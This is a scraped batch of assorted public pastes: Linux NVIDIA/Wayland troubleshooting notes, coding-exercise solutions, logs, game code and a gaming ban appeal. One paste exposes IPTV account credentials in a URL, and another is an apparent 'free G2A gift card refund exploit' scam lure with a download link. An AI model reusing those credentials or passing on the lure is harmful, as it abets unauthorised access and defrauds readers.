  API: Vulkan v: 1.3.279 layers: 1 surfaces: xcb,xlib,wayland device: 0
    type: discrete-gpu driver: nvidia device-ID: 10de:13b0

journalctl -xb -p3
March 10 23:50:43 host kwin_wayland[1443]: kwin_wayland_drm: Pageflip timed out! This is a kernel bug
March 10 23:50:48 host kwin_wayland[1443]: kwin_wayland_drm: Pageflip timed out! This is a kernel bug
March 10 23:50:53 host kwin_wayland[1443]: kwin_wayland_drm: Pageflip timed out! This is a kernel bug
March 10 23:50:57 host kwin_wayland[1443]: kwin_wayland_drm: Pageflip timed out! This is a kernel bug
March 10 23:51:02 host kwin_wayland[1443]: kwin_wayland_drm: Pageflip timed out! This is a kernel bug
March 10 23:51:07 host kwin_wayland[1443]: kwin_wayland_drm: Pageflip timed out! This is a kernel bug
# sounds like this caused that 5-6 second delay during loading KDE desktop

uname -r
6.7.9-arch1-1
# Intel i7 x86_64 CPU

# issue:
# after login system will freeze for 5-6 seconds, then all works

# after suspend desktop is garbage and needs relogin to fix
# applied as suggested during nvidia driver installation but didn't help:
sudo systemctl enable --now nvidia-resume.service

# available services:
systemctl status nvidia-
nvidia-hibernate.service     nvidia-powerd.service        nvidia-suspend.service
nvidia-persistenced.service  nvidia-resume.service

# when enabled nvidia-suspend.service in addition to nvidia-resume.service, system freezed and later could disable that service on recovery console.
# after enabling service and rebooted, status is so:
systemctl status nvidia-resume.service 
○ nvidia-resume.service - NVIDIA system resume actions
     Loaded: loaded (/usr/lib/systemd/system/nvidia-resume.service; enabled; preset: disabled)
     Active: inactive (dead)

# all services are inactive

echo $XDG_SESSION_TYPE
wayland

grep 'ExecStart=' /etc/systemd/system/display-manager.service
ExecStart=/usr/bin/sddm

systemctl status display-manager
● sddm.service - Simple Desktop Display Manager

systemctl --property=Id,Description show display-manager.service
Id=sddm.service
Description=Simple Desktop Display Manager

file /etc/systemd/system/display-manager.service
/etc/systemd/system/display-manager.service: symbolic link to /usr/lib/systemd/system/sddm.service

# SOLUTION
# ... is to use X11 instead of Wayland as Wayland is still not yet ready

/etc/sddm.conf.d/kde_settings.conf
# could be also /etc/sddm.conf or /etc/sddm.conf.d/sddm.conf
[Autologin]
Session=plasmax11
User=<user>
# here is plasmax11 instead of plasma

# also found that this could be also an option to set x11:
# /etc/sddm.conf.d/sddm.conf
# DisplayServer=x11
# (for wayland there could be wayland instead of x11)

# then reboot computer and check, what is running:
echo $XDG_SESSION_TYPE
x11
# X11 works currently better than Wayland:
# login faster, does not freeze on login for some seconds
# after resuming from suspend there are no glitches
# especially when you happen to have nVidia GPU
#
# hopefully will Wayland work fine in future
# so we can stick with Wayland,
# which promises to be way more flexible than X11"
6ew7Mh1c,Tvott,TGMJUNIOR,HTML,Sunday 10th of March 2024 05:34:38 PM CDT,"#EXTM3U

http://703905389557374489.0222ofd.xyz/get.php?username=ja44179&password=K75JRwFwtUR&type=m3u_plus"
sgH6GR28,Untitled,saimpot,PHP,Sunday 10th of March 2024 05:29:17 PM CDT,"```Subject: Appeal for Account Unban - Misunderstanding Regarding Gameplay Activities

Dear World of Warcraft Support Team,

I hope this message finds you well. I am writing to appeal the recent ban on my account, which was attributed to allegations of using hacks and cheating programs. As a dedicated member of the World of Warcraft community, particularly within the Wrath of the Lich King realm, I am deeply troubled by this accusation and believe there has been a misunderstanding.

I have been an active and committed player, known for organizing weekly Onyxia mount runs for both 10 and 25-man groups. Furthermore, I manage a Discord server dedicated to coordinating players for challenging achievements, such as the Trial of the Grand Crusader (TOGC) 25 with 50/50 attempts, where we have achieved notable success. My commitment to the community and the game is evident through my extensive achievement points, which I have accumulated with diligence and hard work.

I want to clarify the situation that I believe led to my account's suspension. I was engaged in legitimately farming Bloodsail Buccaneers reputation up to Exalted status. Post reaching Honored, the only viable method to continue this progression involves defeating a specific Goblin NPC in the Badlands, associated with Booty Bay. Unfortunately, this activity seemed to have been misconstrued by some players, particularly lower-level ones, who perceived it as griefing due to their belief that I was eliminating a quest-related NPC.

This misunderstanding escalated when a displeased player threatened to report me based on incorrect assumptions about my actions. I want to emphasize that my gameplay strategy was entirely within the game's rules and was not intended to disrupt or negatively impact other players' experiences.

Given my long-standing and active participation in the World of Warcraft community, it is disheartening to face such accusations. I have invested considerable time and effort into my account, and the notion of jeopardizing it with prohibited activities is contrary to everything I have worked towards in this game.

I kindly request a re-evaluation of the circumstances leading to my account's suspension. I am more than willing to provide any additional information or clarification needed to resolve this matter. I am hopeful for an opportunity to continue contributing positively to the World of Warcraft community.

Sincerely,

Dionysis [Your Battle.net ID or Character Name]```"
6yid0kFR,Untitled,smj007,Python,Sunday 10th of March 2024 05:28:11 PM CDT,"class Solution:
    def pivotIndex(self, nums: List[int]) -> int:
    
        totalSum = sum(nums)
        running_sum = 0

        for i in range(len(nums)):
            running_sum = running_sum + nums[i]

            left_sum = running_sum - nums[i]
            right_sum = totalSum - running_sum

            if left_sum == right_sum:
                return i
            
        return -1"
MPCJ2seh,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Sunday 10th of March 2024 05:24:28 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_827462.pdf

Working as of:
10 March 2024





















"
UUy8Hpvi,TooManyRequests: received 429 HTTP response,Vault-TecTradingCo,Python,Sunday 10th of March 2024 05:10:02 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/main.py"", line 258, in main
    for comment in comment_stream:
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/util.py"", line 138, in stream_generator
    for item in reversed(list(function(limit=limit, **function_kwargs))):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 63, in __next__
    self._next_batch()
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 712, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 517, in _objectify_request
    self.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/src/prawcore/prawcore/sessions.py"", line 325, in request
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/src/prawcore/prawcore/sessions.py"", line 264, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.TooManyRequests: received 429 HTTP response
"
Mfhbqfi1,focused,bluebyt,INI file,Sunday 10th of March 2024 05:08:56 PM CDT,"[2m2024-03-10T20:36:49.999473Z[0m [34mDEBUG[0m [2muniversal_config[0m[2m:[0m [2m161:[0m Using config dir: /home/bluebyt/.config/ironbar
[2m2024-03-10T20:36:49.999542Z[0m [34mDEBUG[0m [2muniversal_config[0m[2m:[0m [2m140:[0m Found file at: '/home/bluebyt/.config/ironbar/config.corn
[2m2024-03-10T20:36:50.000011Z[0m [34mDEBUG[0m [2mironbar[0m[2m:[0m [2m288:[0m Loaded config file
[2m2024-03-10T20:36:50.000025Z[0m [32m INFO[0m [2mironbar[0m[2m:[0m [2m111:[0m Ironbar version 0.15.0-pre
[2m2024-03-10T20:36:50.000031Z[0m [32m INFO[0m [2mironbar[0m[2m:[0m [2m112:[0m Starting application
[2m2024-03-10T20:36:50.001123Z[0m [34mDEBUG[0m [2msctk[0m[2m:[0m [2m456:[0m Bound new global [40] wl_output v4    
[2m2024-03-10T20:36:50.001142Z[0m [34mDEBUG[0m [2msctk[0m[2m:[0m [2m496:[0m Bound new global [19] zxdg_output_manager_v1 v3    
[2m2024-03-10T20:36:50.001152Z[0m [34mDEBUG[0m [2msctk[0m[2m:[0m [2m456:[0m Bound new global [15] wl_seat v7    
[2m2024-03-10T20:36:50.001159Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_foreign_toplevel::manager[0m[2m:[0m [2m25:[0m Bound to ZwlForeignToplevelManagerV1 global
[2m2024-03-10T20:36:50.001165Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_data_control::manager[0m[2m:[0m [2m29:[0m Bound to ZwlDataControlManagerV1 global
[2m2024-03-10T20:36:50.001187Z[0m [34mDEBUG[0m [2mironbar::clients::wayland[0m[2m:[0m [2m318:[0m received roundtrip request
[2m2024-03-10T20:36:50.001419Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wl_output[0m[2m:[0m [2m64:[0m Handler received new output
[2m2024-03-10T20:36:50.001438Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wl_seat[0m[2m:[0m [2m30:[0m Handler received new capability
[2m2024-03-10T20:36:50.001443Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wl_seat[0m[2m:[0m [2m38:[0m Adding new data control device
[2m2024-03-10T20:36:50.001450Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wl_seat[0m[2m:[0m [2m30:[0m Handler received new capability
[2m2024-03-10T20:36:50.001456Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_foreign_toplevel[0m[2m:[0m [2m47:[0m Manager received new handle
[2m2024-03-10T20:36:50.001460Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_foreign_toplevel[0m[2m:[0m [2m47:[0m Manager received new handle
[2m2024-03-10T20:36:50.001464Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_foreign_toplevel[0m[2m:[0m [2m47:[0m Manager received new handle
[2m2024-03-10T20:36:50.001468Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_foreign_toplevel[0m[2m:[0m [2m47:[0m Manager received new handle
[2m2024-03-10T20:36:50.001472Z[0m [34mDEBUG[0m [2mironbar::clients::wayland::wlr_foreign_toplevel[0m[2m:[0m [2m47:[0m Manager received new handle"
NrJjVi2m,Rust,dimkiriaoks,Rust,Sunday 10th of March 2024 04:57:59 PM CDT,"fn main(){
    let mut x_string: String = String::new();
    let mut y_string: String = String::new();

    println!(""X?"");
    let _ = std::io::stdin().read_line(&mut x_string);
    
    println!(""Y?"");
    let _ = std::io::stdin().read_line(&mut y_string);

    let x: Result<i32, _> = x_string.parse();
    let y: Result<i32, _> = y_string.parse();
    
    let mut z = x+y;
    println!(""Z: {z}"");
}"
CrQBTRby,Battle,Rattlecat,JavaScript,Sunday 10th of March 2024 03:36:15 PM CDT,"$(eval var i=parseInt,d=[],e='$(provider)'=='twitch'?'melziiD20':'🎲20',j=0,l,m='$(query)'.match(/^(([0-9]+)\s+)?(([0-9]+)?d([0-9]+)|([0-9]+))$/)??{},c=i(m[2]??1),n=i(m[4]??1),s=i(m[5]??m[6]??20);c=c>20?20:(c<1||!c?1:c);n=(n<1?1:n);s=(s<1?1:s);for(;j<c;j+=1){d.push(Math.round(n*(s-1)*Math.random())+n)}r=`$(u) deals $(t) ${d.join(', ')} damage with ${n<2?'a ':n+'×'}🎲`+s;l=r.lastIndexOf(',');(l<0?r:r.substr(0,l)+' and'+r.substr(l+1)).replace(/( |🎲)20(,| |$)/g,` ${ e } $2`)). $(eval a=$(urlfetch json https://pastebin.com/raw/CrQBTRby);a[Math.floor(Math.random()*a.length)])"
0w8NPXFb,asdasdasd,Sashaiolh,Lua,Sunday 10th of March 2024 03:33:42 PM CDT,"local component = require(""component"")
local computer = require(""computer"")
local debug = computer.addUser
local gpu = component.gpu
xresolution=153
gpu.setResolution(xresolution,52)
gpu.setBackground(0x202020)
gpu.setForeground(0xFFDD00)
gpu.fill(1,1,xresolution,75,"" "")
gpu.set((30-(string.len(""DeviceCraft Managment""))/2),2,""DeviceCraft Managment"")
gpu.set((30-(string.len(""By Durex77""))/2),3,""By Durex77"")
status1="" [Online] ""
status2="" [Offline]""
owner={'XRASER','BeTePb'}
admin={'SergeyZez','SplittingReality'}
builder={'AnshaABDUL372','MaxonZ',}
tehadmin={'lLuffy'}
trumod={'REAKTOR','iIiIiIiMuSiC_oF'}
modn={'Sierr67','PIXOH','HolltiSS','BuTaMuH4iK','Bazoor','NightmareMoon'}
donmod={'dark321','GangaMstar','Gra4_',}
helper={'Night_Raven','TheRedMan','Duno'}

while true do
d=5
d=d+1
gpu.setForeground(0x8B1A1A)
gpu.set((xresolution/2-(string.len(""[Owner]""))/2),d,""[Owner]"")
d=d+1

for j = 1, #owner do

d=d+1
name=owner[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end

d=d+2
gpu.setForeground(0xCC0000)
gpu.set((xresolution/2-(string.len(""[Admin]""))/2),d,""[Admin]"")
d=d+1

for j = 1, #admin do

d=d+1
name=admin[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end

d=d+2
gpu.setForeground(0x473C8B)
gpu.set((xresolution/2-(string.len(""[builder]""))/2),d,""[builder]"")
d=d+1

for j = 1, #builder do

d=d+1
name=builder[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end

d=d+2
gpu.setForeground(0xCC0000)
gpu.set((xresolution/2-(string.len(""[Teh-Admin]""))/2),d,""[Teh-Admin]"")
d=d+1

for j = 1, #tehadmin do
d=d+1
name=tehadmin[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end


d=d+2
gpu.setForeground(0x0066FF)
gpu.set((xresolution/2-(string.len(""[TrueMod]""))/2),d,""[True-Mod]"")
d=d+1

for j = 1, #trumod do
d=d+1
name=trumod[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end

d=d+2
gpu.setForeground(0xCD2990)
gpu.set((xresolution/2-(string.len(""[Modn]""))/2),d,""[Modn]"")
d=d+1

for j = 1, #modn do
d=d+1
name=modn[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end

d=d+2
gpu.setForeground(0xCC0000)
gpu.set((xresolution/2-(string.len(""[Don-Mod]""))/2),d,""[Don-Mod]"")
d=d+1

for j = 1, #donmod do
d=d+1
name=donmod[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end

d=d+2
gpu.setForeground(0x00FF00)
gpu.set((xresolution/2-(string.len(""[Helper]""))/2),d,""[Helper]"")
d=d+1

for j = 1, #helper do
d=d+1
name=helper[j]
prov=debug(name)
if prov ~= nil then gpu.setForeground(0x00FF00) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status1) else gpu.setForeground(0xFF0000) gpu.set(((xresolution/2)-4-(string.len(name))/2),d,name..status2) end
computer.removeUser(name)
end


os.sleep(1.5)

end"
N51k8zrz,Untitled,smj007,Python,Sunday 10th of March 2024 03:17:33 PM CDT,"class Solution:
    def topKFrequent(self, nums: List[int], k: int) -> List[int]:

        # build a heap 
        hashmap = defaultdict(int)
        maxheap = []
        for num in nums:
            hashmap[num] += 1

        for num, count in hashmap.items():
            heapq.heappush(maxheap, (-count, num))

        result = []
        for _ in range(k):
            if maxheap:
                top, val = heapq.heappop(maxheap)
                result.append(val)

        return result

        "
xiUFz0A3,Functional programming,AlexG2230954,F#,Sunday 10th of March 2024 02:50:59 PM CDT,"type Seq<'a> = Getter of (unit -> ('a * Seq<'a>) option)

let PrintSeq (seq: Seq<'a>) =
    let rec _step getter =
        match getter() with
        | None -> ()
        | Some(el, Getter(nextGetter)) ->
            printf ""%A, "" el
            _step nextGetter
    
    match seq with
    | Getter(f) -> _step f

let Map seq f =
    let rec _step getter () =
        match getter() with
        | None -> None
        | Some(el, Getter(nextGetter)) ->
            Some(f el, Getter(_step nextGetter))
    
    match seq with
    | Getter(g) -> Getter(_step g)

let Reduce seq f =
    let rec _step value getter =
        match getter() with
        | None -> value
        | Some(el, Getter(nextGetter)) ->
            _step (f value el) nextGetter

    match seq with
    | Getter(g) ->
        match g() with
        | None -> None
        | Some(el, Getter(getter)) -> Some(_step el getter)

// Sequences

let Range a b c : Seq<int> =
    let rec _getter x () =
        if x >= b then None
        else Some(x, Getter(_getter (x + c)))
    Getter(_getter a)

let rng = Range 1 5 1
let x = Reduce rng (+)

match x with
| Some(y) -> printfn ""%d"" y
| None -> printfn ""neon""
"
iNprNhKu,Untitled,smj007,Python,Sunday 10th of March 2024 02:48:36 PM CDT,"class Solution:

    def __init__(self, w: List[int]):
        self.w = w
        self.prefix_sum = 0
        self.prefix = []
        for num in self.w:
            self.prefix_sum += num
            self.prefix.append(self.prefix_sum)

    def pickIndex(self) -> int:

        target = self.prefix_sum * random.random()
        low = 0; high = len(self.w) - 1

        while (low <= high):
            mid = (low + high)//2
            if target < self.prefix[mid]:
                high = mid - 1
                result = mid
            else:
                low = mid + 1

        return result "
hgfTZY0d,Print DNA,bAngelov,JavaScript,Sunday 10th of March 2024 02:36:55 PM CDT,"function solve(size) {
    let sequence = ""ATCGTTAGGG"";
    for (
        let i = 0, dash = 0, star = 2, char = 0;
        i < size;
        i++, star = star !== -1 ?(star - 1):2, char = (char + 2) % sequence.length, dash = 6 - (Math.abs(star) * 2 + 2)
    ) {
        let currentStar = Math.abs(star)
        let [a,b] = [sequence[char], sequence[char+1]]
        console.log(`${'*'.repeat(currentStar)}${a}${'-'.repeat(dash)}${b}${'*'.repeat(currentStar)}`)
    }
}"
LTqD2Cxn,Refactor Game 80Casual (IA helper),martin_santome,C++,Sunday 10th of March 2024 02:06:30 PM CDT,"/*********************************************
** MAIN
**********************************************/

#include <iostream>
#include ""Game.hpp""

int main() {
    try {
        Game game; // Create the game instance
        game.run(); // Enter the main loop of the game
        return 0; // Exit with success status
    }
    catch (const std::exception& e) {
        std::cerr << ""An exception has occurred: "" << e.what() << std::endl;
        return 1; // Exit with error status
    }
    catch (...) {
        std::cerr << ""An unknown exception has occurred."" << std::endl;
        return 2; // Exit with error status indicating an unknown exception
    }
}

/*********************************************
** GAME.HPP
**********************************************/


// Game.hpp
#ifndef GAME_HPP
#define GAME_HPP

#include <SFML/Graphics.hpp>
#include ""HUD.hpp""
#include ""Player.hpp""
#include ""AssetManager.hpp""
#include ""Utilities.hpp""

class Game {
public:
    Game();
    void run();

private:
    sf::RenderWindow window;
    Player player;
    HUD hud;
    sf::View uiView, dyView, miniMap;
    sf::Sprite bg;
    sf::RectangleShape rectPl; // Placeholder for the player in the minimap
    sf::Clock clock;

    void initialize();
    void processEvents();
    void update(sf::Time deltaTime);
    void render();
    void setupViews(const sf::Vector2u& windowSize);
    void setupBackground();
    void setupMiniMap();
};

#endif // GAME_HPP

/*********************************************
** GAME.CPP
**********************************************/

// Game.cpp
#include ""Game.hpp""

Game::Game() : window(sf::VideoMode(640, 480), ""Testing"") {
    initialize();
}

void Game::initialize() {
    setupBackground();
    setupViews(window.getSize());
    setupMiniMap();
    // Initialize player and hud if needed here
}

void Game::setupViews(const sf::Vector2u& windowSize) {
    uiView.setSize(sf::Vector2f(windowSize));
    uiView.setViewport(sf::FloatRect(0.f, 0.f, 1.f, 1.f));

    dyView.setSize(sf::Vector2f(windowSize));
    dyView.setViewport(sf::FloatRect(0.f, 0.f, 1.f, 1.f));
}

void Game::setupBackground() {
    bg.setTexture(AssetManager::GetTexture(Utils::GetWorkingDirectory() + ""Media/Backgrounds/bg3-1.png""));
    bg.setPosition(0, 0);
    bg.setOrigin(0, 0);
}

void Game::setupMiniMap() {
    miniMap.setViewport(sf::FloatRect(0.75F, 0.f, 0.25F, 0.25F));
    // Setup miniMap size based on the background size
    miniMap.setSize(sf::Vector2f(bg.getLocalBounds().width, bg.getLocalBounds().height));
}

void Game::run() {
    sf::Clock clock;
    while (window.isOpen()) {
        sf::Time deltaTime = clock.restart();
        processEvents();
        update(deltaTime);
        render();
    }
}

void Game::processEvents() {
    sf::Event event;
    while (window.pollEvent(event)) {
        if (event.type == sf::Event::Closed) {
            window.close();
        }
        // Add more event handling here as needed
    }
    // Additional real-time input handling could go here or inside Player::handleInput
}

void Game::update(sf::Time deltaTime) {
    // Update game state, player, HUD, etc.
    hud.update(deltaTime); // Assuming hud.update needs deltaTime
    player.update(deltaTime, window); // This is indicative; actual Player::update might differ
}

void Game::render() {
    window.clear();
    
    // Set view to default for drawing background and reset for UI components
    window.setView(window.getDefaultView());
    window.draw(bg);

    // Example of how to switch views
    // if (player.getPosition().x < 320) { window.setView(window.getDefaultView()); }
    // else { window.setView(dyView); }
    // Update dyView center if necessary based on player position

    player.draw(window); // Delegate drawing the player
    // Drawing minimap, UI elements, etc. could follow here

    window.setView(uiView);
    hud.draw(window); // Delegate drawing HUD

    window.display();
}


/*********************************************
** HUD.HPP
**********************************************/

// HUD.hpp
#ifndef HUD_HPP
#define HUD_HPP

#include <SFML/Graphics.hpp>
#include ""AssetManager.hpp""
#include ""Utilities.hpp""

class HUD {
public:
    HUD();

    void update(const sf::Time& deltaTime);
    void draw(sf::RenderWindow& window);

private:
    sf::Font font;
    sf::Text oneUp, score, tDelta, tElapsed, tElapsed2;
    sf::RectangleShape lifeBar;

    void setupText();
    void setupLifeBar();
};

#endif // HUD_HPP


/*********************************************
** HUD.CPP
**********************************************/

// HUD.cpp
#include ""HUD.hpp""

HUD::HUD() {
    setupText();
    setupLifeBar();
}

void HUD::setupText() {
    font = AssetManager::GetFont(Utils::GetWorkingDirectory() + ""Media/Fonts/KOMIKAP_.ttf"");

    oneUp.setFont(font);                   
    oneUp.setString(""1 UP"");               
    oneUp.setCharacterSize(30U);           
    oneUp.setFillColor(sf::Color::White);  
    oneUp.setPosition(sf::Vector2f(50,10));

    score.setFont(font);                   
    score.setString(""12345"");              
    score.setCharacterSize(20U);           
    score.setFillColor(sf::Color::White);  
    score.setPosition(sf::Vector2f(50,50));

    tDelta.setFont(font);                   
    tDelta.setCharacterSize(10U);           
    tDelta.setFillColor(sf::Color::Red);    
    tDelta.setPosition(sf::Vector2f(50.f, 300.f));

    tElapsed.setFont(font);                 
    tElapsed.setCharacterSize(10U);         
    tElapsed.setFillColor(sf::Color::Red);  
    tElapsed.setPosition(sf::Vector2f(50.f,325.f));

    tElapsed2.setFont(font);                
    tElapsed2.setCharacterSize(10U);        
    tElapsed2.setFillColor(sf::Color::Red); 
    tElapsed2.setPosition(sf::Vector2f(50.f,350.f));
}

void HUD::setupLifeBar() {
    lifeBar.setSize(sf::Vector2f(96.f, 10.f));
    lifeBar.setFillColor(sf::Color::Green);
    lifeBar.setOrigin(lifeBar.getSize()*0.5F);
}

void HUD::update(const sf::Time& deltaTime) {
    // Update dynamic text (e.g., timers, scores) based on game state
    // Example: Update deltaTime text
    tDelta.setString(""Delta: "" + std::to_string(deltaTime.asSeconds()) + ""s"");
}

void HUD::draw(sf::RenderWindow& window) {
    // Draw all HUD elements
    window.draw(oneUp);
    window.draw(score);
    window.draw(tDelta);
    window.draw(tElapsed); // Note: You'll need to update tElapsed and tElapsed2 as needed
    window.draw(tElapsed2);
    window.draw(lifeBar); // Note: Position needs to be updated based on the game state
}


/*********************************************
** PLAYER.HPP
**********************************************/

// Player.hpp
#ifndef PLAYER_HPP
#define PLAYER_HPP

#include <SFML/Graphics.hpp>
#include ""Animator.hpp""

class Player {
public:
    Player(const sf::Texture& texture);

    void handleInput();
    void update(sf::Time deltaTime);
    void draw(sf::RenderWindow& window);

private:
    sf::Sprite sprite;
    Animator animator;
    sf::Vector2f velocity;

    void setupAnimations();
};

#endif // PLAYER_HPP


/*********************************************
** PLAYER.CPP
**********************************************/
// Player.cpp
#include ""Player.hpp""

Player::Player(const sf::Texture& texture) : sprite(texture), velocity(0.f, 0.f) {
    setupAnimations();
}

void Player::setupAnimations() {
    // Assuming animations have been loaded into `animator`
    // Example:
    // Animation walkAnimation;
    // walkAnimation.texture = &someTexture;
    // walkAnimation.frames.push_back(sf::IntRect(...));
    // animator.AddAnimation(""Walk"", walkAnimation);
}

void Player::handleInput() {
    // Handle player input and adjust velocity or switch animations accordingly
    // Example:
    // if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left)) { ... }
}

void Player::update(sf::Time deltaTime) {
    // Update the player's position and animation
    sprite.move(velocity * deltaTime.asSeconds());
    animator.Update(deltaTime);
    animator.ApplyToSprite(sprite);
}

void Player::draw(sf::RenderWindow& window) {
    window.draw(sprite);
}

/*********************************************
** ANIMATOR.hPP
**********************************************/

// Animator.hpp
#ifndef ANIMATOR_HPP
#define ANIMATOR_HPP

#include <SFML/Graphics.hpp>
#include <map>
#include <string>
#include <vector>

class Animation {
public:
    std::vector<sf::IntRect> frames;
    const sf::Texture* texture;
    sf::Time duration;
    bool loop;

    Animation() : texture(nullptr), duration(sf::seconds(1)), loop(true) {}
};

class Animator {
public:
    Animator() : currentAnimation(nullptr) {}

    void AddAnimation(const std::string& name, const Animation& animation);
    void SwitchAnimation(const std::string& name);
    void Update(sf::Time deltaTime);
    void ApplyToSprite(sf::Sprite& sprite) const;

private:
    std::map<std::string, Animation> animations;
    const Animation* currentAnimation;
    sf::Time currentTime;
    size_t currentFrame;

    void reset();
};

#endif // ANIMATOR_HPP



/*********************************************
** ANIMATOR.cPP
**********************************************/


// Animator.cpp
#include ""Animator.hpp""

void Animator::AddAnimation(const std::string& name, const Animation& animation) {
    animations[name] = animation;
}

void Animator::SwitchAnimation(const std::string& name) {
    auto it = animations.find(name);
    if (it != animations.end()) {
        currentAnimation = &it->second;
        reset();
    }
}

void Animator::Update(sf::Time deltaTime) {
    if (!currentAnimation) return;

    currentTime += deltaTime;

    float scaledTime = currentTime.asSeconds() / currentAnimation->duration.asSeconds();
    size_t numFrames = currentAnimation->frames.size();
    currentFrame = static_cast<size_t>(scaledTime * numFrames);

    if (currentAnimation->loop)
        currentFrame %= numFrames;
    else if (currentFrame >= numFrames)
        currentFrame = numFrames - 1;
}

void Animator::ApplyToSprite(sf::Sprite& sprite) const {
    if (!currentAnimation) return;
    sprite.setTexture(*currentAnimation->texture);
    sprite.setTextureRect(currentAnimation->frames[currentFrame]);
}

void Animator::reset() {
    currentTime = sf::Time::Zero;
    currentFrame = 0;
}

"
QrGCv45r,Untitled,ShRooK_MoHameD,C++,Sunday 10th of March 2024 01:47:16 PM CDT,"
void solve(){

   ll n; cin >> n;
   vector < ll > v;
   for (int i = 1; i <= n; i++)  v.push_back(i);
   

   set < ll > st (all(v));

   for (int i = 1; i < sz(v) ; i += 2)
   {
     
  
        cout << v[i] << "" "";
        st.erase(v[i]);

       
        if(i == sz(v) - 2 and st.find(v[i]) == st.end()) v.assign(all(st)) , i = -2;
        
        if(i == sz(v) - 1  and st.find(v[i]) == st.end()) v.assign(all(st)) , i = -1;
        

      }

      cout(st);
   

   
} "
rtecSkG6,Untitled,joe1970,C++,Sunday 10th of March 2024 01:40:13 PM CDT,"#include ""Animator.hpp""
#include ""AssetManager.hpp""
#include ""Utilities.hpp""
#include <iostream>
#include <stdexcept>
#include <string>

int main()
{
    try
    {
        sf::RenderWindow window(sf::VideoMode(640,480), ""Testing"");
        auto wSize=window.getSize();
        
        // Background
        sf::Sprite bg(AssetManager::GetTexture(Utils::GetWorkingDirectory() + ""Media/Backgrounds/bg3-1.png""));
        // Default Position and Origin
        bg.setPosition(sf::Vector2f(0,0));
        bg.setOrigin(sf::Vector2f(0,0));


        // Default View (0,0,640, 480) Center (320, 240) y viewPort (0,0,1,1)
        // UI View
        sf::View uiView(sf::FloatRect(0.f,0.f,wSize.x,wSize.y ));
        uiView.setViewport(sf::FloatRect(0.f,0.f,1.f,1.f));
        // Con esta definición el Center es (320, 240)
        
        // Dynamic View
        sf::View dyView(sf::FloatRect(0.f,0.f,wSize.x,wSize.y));
